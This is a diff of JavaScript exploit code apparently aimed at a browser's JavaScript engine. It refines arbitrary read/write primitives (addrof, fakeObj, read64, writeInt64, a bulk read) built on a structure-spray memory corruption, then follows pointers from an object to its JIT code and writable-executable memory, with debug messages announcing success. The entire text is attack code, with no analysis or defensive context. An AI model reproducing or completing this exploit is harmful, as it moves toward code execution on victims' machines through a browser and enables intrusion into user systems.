@@ -306,17 +306,10 @@ var victim1 = structure_spray[0];
         victim1[0] = qwordAsFloat(shared);
         outer.header = jscell_header;*/
         //var origButterfly = hax[1];
-        function assert(expectedResult, descriptionOfCorrectResult) {
-   if (!expectedResult) {
-      fuck.port.postMessage(descriptionOfCorrectResult);
-      return false;
-   } else {
-      fuck.port.postMessage('test passed');
-      return true;
-   }
-};
 
         fuck.port.postMessage("here111")
+        //var orig = qwordAsFloat(hax[1])
+        //fuck.port.postMessage(orig);
         var memory = {
         addrof: addrof,
         fakeobj: fakeObj,
@@ -324,13 +317,13 @@ var victim1 = structure_spray[0];
         // Write an int64 to the given address.
         writeInt64(addr, int64) {
             hax[1] = qwordAsFloat(addr+0x10);
-            victim.pointer = hex(int64);
+            victim.pointer = int64;
         },
 
         // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
         write16(addr, value) {
             // Set butterfly of victim object and dereference.
-            hax[1] = wordAsFloat(addr+0x10);
+            hax[1] = qwordAsFloat(addr+0x10);
             victim.pointer = value;
         },
 
@@ -350,7 +343,26 @@ var victim1 = structure_spray[0];
         read64(addr) {
             // Set butterfly of victim object and dereference.
             hax[1] = qwordAsFloat(addr+0x10);
-            return this.addrof(victim.pointer);
+            return victim.pointer;
+            //return this.addrof(victim.pointer);
+        },
+        read: function(addr, length) {
+            var a = new Array(length);
+            var i;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.read64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.read64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
         },
 
         // Verify that memory read and write primitives work.
@@ -360,12 +372,15 @@ var victim1 = structure_spray[0];
 
             var addr = this.addrof(obj);
             fuck.port.postMessage("test addr" + addr)
-            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");
+            if(this.fakeObj(addr).p !== v) {
+            fuck.port.postMessage("addrof and/or fakeobj does not work");
+            }
 
-            var propertyAddr = (addr+0x10);
+            var propertyAddr = addr+0x10;
 
             var value = this.read64(propertyAddr);
-            assert(qwordAsFloat(value) == qwordAsFloat(addrof(v)), "read64 does not work");
+            fuck.port.postMessage(value + "vs" + addrof(v))
+            //assert(qwordAsFloat(value) == qwordAsFloat(addrof(v)), "read64 does not work");
         },
     }
 
@@ -374,25 +389,18 @@ var victim1 = structure_spray[0];
         
         //var shared_butterfly = floatAsQword(e[1]);
         fuck.port.postMessage("we hax1 arb r/w obj!!!");
-        //hax[1] = boxed;
-        //e[1] = qwordAsFloat(shared_butterfly);
-        //outer.header = jscell_header;
-        /*var outer = {
-            hex1(floatAsQword(jscell_header))
-        }*/
-        /*var read64: function(where) {
-            evil_arr[boxed_offset] = qwordAsFloat(where + 0x10);
-
-        }*/
-        //fuck.port.postMessage("header of array double" + hex1(addrof([13.37,13.37])))
-        //fuck.port.postMessage("header of array contigous" + hex1(addrof([13.37,13.37])))
-
-        //fuck.port.postMessage("about to test and see if addrof and fakeobj work");
-        //fuck.port.postMessage("before proceeding");
-        /*if(hex1(fakeObj(hex1(addrof({a:0x1337}))).a)!= 0x1337) {
-            fuck.port.postMessage(`retry`);
-        }*/
         
+    
+        
+            
+        var sinFuncAddr = addrof({});
+        fuck.port.postMessage(sinFuncAddr);
+        var executableAddr = memory.read64(sinFuncAddr);
+        
+        var jitCodeAddr = memory.read64(executableAddr);
+        
+        var rxMemAddr = memory.read64(jitCodeAddr);
+        fuck.port.postMessage(rxMemAddr)
         
         fuck.port.postMessage("it works!!!");
 
